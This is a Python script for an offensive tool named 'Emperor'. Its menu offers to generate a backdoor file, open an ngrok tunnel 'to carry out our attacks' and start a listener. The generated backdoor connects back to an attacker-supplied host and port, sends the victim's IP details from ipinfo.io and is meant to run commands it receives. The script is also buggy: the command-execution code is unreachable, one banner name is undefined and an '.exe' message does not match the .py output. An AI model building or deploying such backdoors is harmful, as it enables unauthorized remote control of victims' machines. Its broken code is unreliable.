#!/usr/bin/env python

import os
import time
import socket
import requests
import subprocess

EMPEROR_LOGO_BANNER = ("""
\033[97;1m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⠶⠿⢿⣿⣿⣿⣿⣷⣶⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠋⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣴⣾⣿⣿⣿⣷⣶⣤⡈⠙⢿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣿⣿⣿⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⣿⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢿⣿⣿⣿⣿⣇⠀⠀
⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢸⣿⣿⣿⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢹⣿⣿⣿⣿⣿⣆⣠⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣷⠀
⠀⠀⢰⣶⡆⠀⠀⠀⠀⢀⣀⣀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣿⣿⣿⣿⣿⣿⡆
⢀⠀⢸⣿⣧⣰⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣾⣿⣿⣿⣿⣿⣿⣇
⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣈⠉⠛⠛⠛⠛⢉⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋
⣶⣌⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣋⣥⣾⡿
⠙⢿⣿⣷⣶⣬⣙⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⢛⣉⣥⣴⣾⣿⣿⣿⣿⡇
⠀⠀⠙⣿⡟⢿⣿⣿⣿⣷⣶⣦⣬⣭⣉⣙⣛⣛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⢛⣛⣛⣋⣩⣭⣭⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠀⠀⠀⣿⡇⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⠀⠀⠀⠀⢠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⢉⣭⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[0m
\033[97;1m AUTHOR:\033[0m \033[91m@Император Сидий\033[0m
\033[97;1m VERSION:\033[0m \033[91m1.0.0\033[0m \033[97;1m[BETA]\033[0m
\033[97;1m GITHUB:\033[0m \033[91mhttps://github.com/Sidius999\033[0m
\033[97;1m DISCORD:\033[0m \033[91msidius.sith_\033[0m
""")

EMPEROR_MENU_BANNER = ("""
 \033[97;1m╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗\033[0m
 \033[97;1m║>>>\033[0m \033[91mhelp\033[0m           \033[97;1mDisplay all [Emperor] software commands                           ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mbackdoor\033[0m       \033[97;1mGenerate a backdoor '.py' file                                    ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mngrok\033[0m          \033[97;1mDeploy a remote server to carry out our attacks                   ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mlistener\033[0m       \033[97;1mStart the [listener] tool                                 ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mbanner\033[0m         \033[97;1mDisplay software banner                                           ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [Emperor] software                                         ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mleave\033[0m          \033[97;1mQuit [Emperor] software                                           ║\033[0m
 \033[97;1m╚═════════════════════════════════════════════════════════════════════════════════════╝\033[0m
""")

LISTENER_MENU_BANNER = ("""
 \033[97;1m╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗\033[0m
 \033[97;1m║>>>\033[0m \033[91mhelp\033[0m           \033[97;1mDisplay all [listener] tool commands                              ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mipinfo  \033[0m       \033[97;1mObtain all the IP address information of the target machine       ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [listener] tool                                         ║\033[0m
 \033[97;1m║>>>\033[0m \033[91mleave\033[0m          \033[97;1mQuit [listener] tool                                              ║\033[0m
 \033[97;1m╚═════════════════════════════════════════════════════════════════════════════════════╝\033[0m
""")

os.system("clear")

def TEXT_DELAY(TEXT, DELAY):
    for CHAR in TEXT:
        print(CHAR, end='', flush=True)
        time.sleep(DELAY)
    print()
    
def BACKDOOR():
    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLHOST\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
    LPORT = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
    print(" \033[97;1m[...] Backdoor generation in '.exe' file in progress...\033[0m")
    time.sleep(2)

    with open("backdoor/backdoor.py", "w") as file:
        file.write(f'''
import os
import time
import socket
import requests
import subprocess


def MALWARE():
    LHOST = "{LHOST}"
    LPORT = {LPORT}

    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SOCKET.connect((LHOST, LPORT))

    while True:
        MALWARE_RECV = SOCKET.recv(8000).decode()
        
        if MALWARE_RECV.lower() == 'ipinfo':
           IPINFO = requests.get("https://ipinfo.io/json")
           SOCKET.send(IPINFO.text.encode())

        if MALWARE_RECV == "exit":
           break

           OUTPUT = subprocess.Popen(MALWARE_RECV, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
           RESULT = OUTPUT.stdout.read() + OUTPUT.stderr.read()
           SOCKET.send(RESULT)

    SOCKET.close()

MALWARE()
''')

def NGROK():
    IP = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mIP\033[0m\033[97;1m]\n\033[97;1m ╚═════════|> \033[0m")
    PORT = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════|> \033[0m")
    NGROK_COMMAND = f"ngrok tcp {IP}:{PORT}"
    subprocess.run(NGROK_COMMAND, shell=True)
    
def LISTENER():
    
    os.system("clear")
    
    TEXT_DELAY(EMPEROR_LOGO_BANNER, 0.0005)
    TEXT_DELAY(LISTENER_MENU_BANNER, 0.0005)
 
    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLHORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
    LPORT = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")

    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SOCKET.bind((LHOST, int(LPORT)))
    SOCKET.listen(10000)

    print("[...] Waiting for the target machine to connect...")

    CONN, ADDR = SOCKET.accept()
    print("[...] Connection established from > ", ADDR)

    while True:
        print("")
        print(" \033[97;1m[Use the 'help' command in the software]\033[0m")
        print(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mlistener\033[0m\033[97;1m]")
        print(" \033[97;1m╚═════════>>>\033[0m", end=" ") 
        LISTENER_INPUT = input()
        
        if LISTENER_INPUT == "help":
           print(" \033[97;1m[...] Watching all [listener] tool commands...\033[0m")
           time.sleep(2)
           TEXT_DELAY(LISTENER_MENU_BANNER, 0.0005)
           time.sleep(10)
           LISTENER() 
           
        if LISTENER_INPUT == "ipinfo":
           CONN.send("ipinfo".encode())
           IPINFO = CONN.recv(8000).decode()
           print(IPINFO)
           
        if LISTENER_INPUT == "reset":
           print(" \033[97;1m[...] Reset the [listener] tool...\033[0m")
           time.sleep(2)
           LISTENER()        

        if LISTENER_INPUT == "exit":
           CONN.send("exit".encode())
           EMPEROR()

    CONN.close()
    SOCKET.close()    

def EMPEROR():

    os.system("clear")
    
    TEXT_DELAY(EMPEROR_LOGO_BANNER, 0.0005)
    TEXT_DELAY(EMPEROR_MENU_BANNER, 0.0005)
    
    while True:
        print("")
        print(" \033[97;1m[Use the 'help' command in the software]\033[0m")
        print(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mEmperor\033[0m\033[97;1m]")
        print(" \033[97;1m╚═════════>>>\033[0m", end=" ") 
        EMPEROR_INPUT = input()
        
        if EMPEROR_INPUT == "help":
           print(" \033[97;1m[...] Watching all [Emperor] software commands...\033[0m")
           time.sleep(2)
           TEXT_DELAY(EMPEROR_MENU_BANNER, 0.0005)
           time.sleep(10)
           EMPEROR()
           
        if EMPEROR_INPUT == "backdoor":
           print(" \033[97;1m[...] Starting [backdoor] in progress...\033[0m")
           time.sleep(2)
           BACKDOOR()
           
        if EMPEROR_INPUT == "ngrok":
           print(" \033[97;1m[...] Starting [ngrok] in progress...\033[0m")
           time.sleep(2)
           NGROK()
           
        if EMPEROR_INPUT == "listener":
           print(" \033[97;1m[...] Starting [listener] in progress...\033[0m")
           time.sleep(2)
           LISTENER()
        
        if EMPEROR_INPUT == "banner":
           print(" \033[97;1m[...] Display the [Emperor] software banner...\033[0m")
           time.sleep(2)
           TEXT_DELAY(DRAC_LOGO_BANNER, 0.0005)
           time.sleep(5)
           EMPEROR()
           
        if EMPEROR_INPUT == "reset":
           print(" \033[97;1m[...] Reset the [Emperor] software...\033[0m")
           time.sleep(2)
           EMPEROR()
        
        if EMPEROR_INPUT == "leave":
           print(" \033[97;1m[...] Quit the [Emperor] software...\033[0m")
           time.sleep(2)
           os._exit(0)
    
EMPEROR()
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
